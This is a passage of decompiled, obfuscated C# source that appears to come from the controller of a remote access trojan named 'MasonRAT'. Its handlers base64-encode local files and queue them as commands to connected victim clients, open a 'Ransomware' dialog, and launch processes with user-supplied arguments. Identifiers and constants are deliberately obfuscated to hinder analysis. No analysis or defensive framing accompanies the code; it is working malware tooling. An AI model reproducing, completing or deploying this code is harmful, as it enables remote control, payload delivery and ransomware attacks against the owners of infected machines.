      System.Diagnostics.Process.Start(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1603) + this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems[0].SubItems[(565257183 - 417057024 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (147039240 + 1390824575 % 694831829 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % ((1759818441 ^ (394212385 | 671690962)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)].Text);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Dڙـژ\u060Aى\u060D\u0609\u0609ـڙ؁ڙىۏ\u0609ـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    OpenFileDialog openFileDialog1 = new OpenFileDialog();
    OpenFileDialog openFileDialog2 = openFileDialog1;
    openFileDialog2.Title = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1604);
    openFileDialog2.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1605);
    if (openFileDialog1.ShowDialog() == DialogResult.OK)
    {
      string fileName = openFileDialog1.FileName;
      try
      {
        string[] strArray = new string[(-170830393 - (792567780 >> 88523745) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (((1979060350 > 798917834 ? 1002852538 : 1337136717) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << ((1139683186 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1606);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(59814590 - 403637876 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + ((343823281 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1607)));
        strArray[((230686724 /*0x0DC00004*/ ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (-211045801 - 2060224032 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << -2075533643 - (556855007 | 202040325) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((1550613129 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (1236515358 + 314097786 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = Convert.ToBase64String(File.ReadAllBytes(fileName));
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u060Dى\u060Dۚ\u060D\u060Aڇ\u0608ڙﻻ\u060Bةـ\u060Bٺ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1608) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1609))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cּـ\u060Dحژْڙڦ\u060C\u0608ۛ\u060Aڇْ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1610));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060D\u0608\u0608ح\u060Eمــۧبـٸـڙۛـ؁\u060Eٽ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1611));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۧڙ\u060Aڕژـټٺ\u060Aۡۚـْ؁ــ̍ٺٻح(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1612) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1613))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cٽژـ\u0608ـڟڣ\u0608بٺ\u060D(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1614));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۨٽ\u060Fټـ̍ـؤ\u060Fحڙڝ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1615));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cﻻـ\u060D\u060A\u0609\u060D\u060Aۡب\u060D(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1616), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1617), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1618), (-315998814 - (1377524235 | 803823412) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + ~((-1221665181 ^ 488220781 << 720033977) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 1521601957 + ~1298880447 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ~((1480083085 > 17778761 ? 222721509 : 296962012) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0);
    if (str.Length != 0)
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1619) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + str);
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـۭـــڜــٺۡ\u060Bبم̨(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cٺح\u060F\u060Eۡــ\u0608م\u060A\u060E\u060F(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    int num = (int) new Ransomware().ShowDialog();
  }

  private void \u2694️MasonRAT\u270Cـطﻋح\u060Fﻋـۙٽـ\u060Eـڙـژط(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1620) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1621))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aـﮪةـﻻـــ\u0020\u060Cـ̍ــْحۡ(object sender, EventArgs e)
  {
    try
    {
      string arguments = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1622), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1623), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1624), (1274142077 << 1978684573) - 688125820 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ~(1857392136 + 138836604 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1, (-1469030364 - -267927634 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ~(83537729 + 1117564999 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1));
      if (arguments.Length == 0)
        return;
      System.Diagnostics.Process.Start(AppDomain.CurrentDomain.BaseDirectory + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1625), arguments);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u060Eـ\u060Dٽـــ\u0608ۧ̍ؤـڠـ\u060Aـ̍؁\u060A(
    object sender,
